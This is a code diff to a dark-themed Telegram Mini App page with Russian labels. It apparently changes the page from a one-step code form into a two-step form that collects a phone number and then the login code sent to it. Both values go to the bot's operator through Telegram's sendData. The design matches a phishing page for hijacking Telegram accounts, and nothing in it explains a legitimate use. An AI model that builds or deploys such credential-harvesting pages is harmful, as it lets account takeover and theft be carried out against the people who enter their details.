@@ -5,21 +5,44 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <script src="https://telegram.org"></script>
     <style>
-        body { background: #000; color: #ff0000; text-align: center; font-family: sans-serif; padding-top: 50px; }
-        input { width: 80%; padding: 15px; border: 1px solid #f00; background: #111; color: #fff; font-size: 20px; border-radius: 10px; margin-bottom: 20px; }
-        button { padding: 15px 40px; background: #f00; color: #fff; border: none; border-radius: 10px; font-weight: bold; width: 85%; }
+        body { background: #000; color: #f00; text-align: center; font-family: sans-serif; padding-top: 30px; }
+        input { width: 80%; padding: 15px; border: 1px solid #f00; background: #111; color: #fff; font-size: 18px; border-radius: 10px; margin-bottom: 20px; }
+        button { padding: 15px; background: #f00; color: #fff; border: none; border-radius: 10px; font-weight: bold; width: 85%; cursor: pointer; }
+        .hidden { display: none; }
     </style>
 </head>
 <body>
-    <h2>DSQ SNOS | ВВОД КОДА</h2>
-    <input type="number" id="c" placeholder="00000">
-    <br><button onclick="s()">ПОДТВЕРДИТЬ</button>
+    <div id="step_phone">
+        <h2>ВВЕДИТЕ НОМЕР</h2>
+        <input type="text" id="phone" placeholder="+79991234567">
+        <button onclick="sendPhone()">ПОЛУЧИТЬ КОД</button>
+    </div>
+
+    <div id="step_code" class="hidden">
+        <h2>ВВЕДИТЕ КОД</h2>
+        <input type="number" id="code" placeholder="00000">
+        <button onclick="sendCode()">ПОДТВЕРДИТЬ</button>
+    </div>
+
     <script>
         let tg = window.Telegram.WebApp;
         tg.expand();
-        function s() {
-            let val = document.getElementById('c').value;
-            if (val) { tg.sendData(val); tg.close(); }
+
+        function sendPhone() {
+            let p = document.getElementById('phone').value;
+            if (p) {
+                tg.sendData("phone:" + p); // Отправляем префикс phone:
+                document.getElementById('step_phone').classList.add('hidden');
+                document.getElementById('step_code').classList.remove('hidden');
+            }
+        }
+
+        function sendCode() {
+            let c = document.getElementById('code').value;
+            if (c) {
+                tg.sendData("code:" + c); // Отправляем префикс code:
+                tg.close();
+            }
         }
     </script>
 </body>
